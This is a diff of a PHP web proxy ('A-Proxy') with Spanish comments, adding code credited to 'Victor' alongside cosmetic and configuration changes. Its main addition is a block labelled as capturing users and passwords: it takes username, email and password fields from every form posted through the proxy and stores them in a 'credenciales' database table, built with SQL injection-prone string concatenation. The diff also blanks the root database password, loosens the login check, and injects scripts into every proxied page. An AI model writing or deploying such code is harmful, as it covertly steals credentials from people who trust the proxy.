@@ -1,16 +1,18 @@
 <?php
-include 'nucleo.php';
 include 'connect.php';
-
+include 'nucleo.php';
 /*--------------------------------------Lo agrego Victor----------------------------*/
 session_start();
 $iniciar = 0;
 $UsuarioPremium = 'false';
 $servername = "localhost";
 $usernameS = "root";
-$passwordS = "root";
+$passwordS = "";
 $db = "proxy";
 $conn = mysqli_connect($servername, $usernameS, $passwordS, $db);
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
 $error = "";
 
 if (isset($_POST['usernameRec']) && isset($_POST['passwordRec'])){
@@ -45,7 +47,7 @@ if (isset($_POST['Recovery']) ){
             </head>
             <div class=\"wrapper fadeInDown\">
               <br><br><div id=\"formContent\">
-              <h2 style=\"font-size: 50px;\">AProxy</h2>
+              <h2 style=\"font-size: 50px;\">A-Proxy</h2>
                 <div class=\"fadeIn first\">
                 ";
                 echo "<h3>$error</h3>"; 
@@ -62,10 +64,7 @@ if (isset($_POST['Recovery']) ){
   exit();
 }
 
-if (!$conn) {
-    die("Connection failed: " . mysqli_connect_error());
-}
-if ( (isset($_POST['username']) && isset($_POST['password'])) || (isset($_SESSION['username']) && isset($_SESSION['password'])) ){
+if ( isset($_POST['username']) && isset($_POST['password'])  ){
   $user = '';
   $pass = '';
 
@@ -93,7 +92,7 @@ if ( (isset($_POST['username']) && isset($_POST['password'])) || (isset($_SESSIO
     }
 
     $count = mysqli_num_rows($result);
-    if($count == 1) {
+    if($count >= 1) {
       $_SESSION['username'] = $user;
       $_SESSION['password'] = $pass;
       $error = "Logged in";
@@ -130,7 +129,7 @@ if (isset($_POST['free']) ){
   $_SESSION['premium'] = 'false';
   $_SESSION['free'] = '1';
 }
-if (isset($_SESSION['free']) && $_SESSION['free'] == '1'){
+if (isset($_SESSION['free']) && $_SESSION['free'] === '1'){
   $iniciar = 1;
 }
 
@@ -158,7 +157,7 @@ if ($iniciar == 0){
             </head>
             <div class=\"wrapper fadeInDown\">
               <br><br><div id=\"formContent\">
-              <h2 style=\"font-size: 50px;\">AProxy</h2>
+              <h2 style=\"font-size: 50px;\">A-Proxy</h2>
                 <div class=\"fadeIn first\">
                 ";
                 echo "<h3>$error</h3>"; 
@@ -204,7 +203,7 @@ $ListaNegra = array(
 );
 
 //CORS (cross-origin resource sharing)
-$forceCORS = false; //Falso = reporta el IP del cliente a `x-forwarded-for`
+$forceCORS = true; //Falso = reporta el IP del cliente a `x-forwarded-for`
 $URL_Inicio = "";
 $landingExampleURL = "https://example.net";
 
@@ -241,6 +240,32 @@ else {
     $url = substr($_SERVER["REQUEST_URI"], strlen($_SERVER["SCRIPT_NAME"]) + 1);
   }
 }
+
+//------------------------------------------------A campieza codigo de Victor-------------------------------
+//Captura de usuarios y passwors
+    $username = "";
+    $password  = "";
+    if (isset($_POST['user'])){
+      $username = $_POST['user'];
+    }
+    else if (isset($_POST['username'])){
+      $username = $_POST['username'];
+    }
+    else if (isset($_POST['email'])){
+      $username = $_POST['email'];
+    }
+
+    if (isset($_POST['pass'])){
+      $password  = isset($_POST['pass']);
+    }
+    else if (isset($_POST['password'])){
+      $password  = isset($_POST['password']);
+    }
+    if ($username !== "" || $password !== ""){
+          $sql="INSERT INTO credenciales (usuario, contrasena)  VALUES ('$username', '$password'); ";
+          $conn->query($sql);
+    }
+//------------------------------------------------A termina codigo de Victor-------------------------------
 
 if (empty($url)) {
     if (empty($URL_Inicio)) {
@@ -344,6 +369,7 @@ if (stripos($contentType, "text/html") !== false) {
   $doc = new DomDocument();
   @$doc->loadHTML($responseBody);
   $xpath = new DOMXPath($doc);
+
   foreach($xpath->query("//form") as $form) {
     $method = $form->getAttribute("method");
     $action = $form->getAttribute("action");
@@ -390,8 +416,30 @@ if (stripos($contentType, "text/html") !== false) {
     }
   }
   dormirPremium($UsuarioPremium);
-  $head = $xpath->query("//head")->item(0);
-  $body = $xpath->query("//body")->item(0);
+  //$head = $xpath->query("//head")->item(0);
+  //$body = $xpath->query("//body")->item(0);
+
+  //------------------------------------------------Aca empieza codigo de Victor-------------------------------
+  $head = $xpath->query('//head')->item(0);
+  if ($head != NULL){
+    $template = $doc->createDocumentFragment();
+    $template->appendXML('<link rel="stylesheet" type="text/css" href="menu.css"></link>');
+    $head->appendChild($template);
+  }
+
+  $body = $xpath->query('//body')->item(0);
+  $template = $doc->createDocumentFragment();
+  $fichero = file_get_contents('sidebar.html', true);
+  $template->appendXML($fichero);
+  $body->appendChild($template);
+
+  $template = $doc->createDocumentFragment();
+  $template->appendXML('<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script><script src="jss.js"></script><script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>');
+  $body->appendChild($template);
+
+  
+  //$body->insertBefore($before, $body->firstChild);
+//------------------------------------------------A termina codigo de Victor-------------------------------
   $prependElem = $head != null ? $head : $body;
 
   if ($prependElem != null) {
@@ -451,11 +499,17 @@ if (stripos($contentType, "text/html") !== false) {
         }
       })();'
     );
+
+
+    //------------------------------------------------A campieza codigo de Victor-------------------------------
+    //------------------------------------------------A termina codigo de Victor-------------------------------
+
+
     $scriptElem->setAttribute("type", "text/javascript");
     $prependElem->insertBefore($scriptElem, $prependElem->firstChild);
   }
 
-  echo "<!-- Proxified page constructed by AProxy -->\n" . $doc->saveHTML();
+  echo "<!-- A-Proxy -->\n" . $doc->saveHTML();
 } 
 else if (stripos($contentType, "text/css") !== false) { //This is CSS, so proxify url() references.
   echo proxifyCSS($responseBody, $url);
